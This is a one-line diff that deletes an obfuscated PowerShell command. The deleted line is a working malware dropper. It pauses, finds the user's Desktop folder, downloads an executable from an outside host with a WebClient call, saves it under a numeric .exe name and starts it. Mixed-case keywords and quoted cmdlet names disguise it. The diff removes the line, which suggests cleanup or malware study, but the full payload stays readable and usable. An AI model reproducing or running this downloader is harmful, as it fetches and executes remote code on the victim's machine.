@@ -1,1 +1,0 @@
-$7d0mK6 = [TypE]'EnVIronMENt' ; &'sleep' 33;${Des} = $7d0mk6::gETfolDeRPaTH('Desktop');(&'New-Object' 'System.Net.WebClient').downLOadFiLE.InVokE('http://rhemet.co/bkr','$Des\7117257.exe');&'Start-Process' $Des\7117257.exe
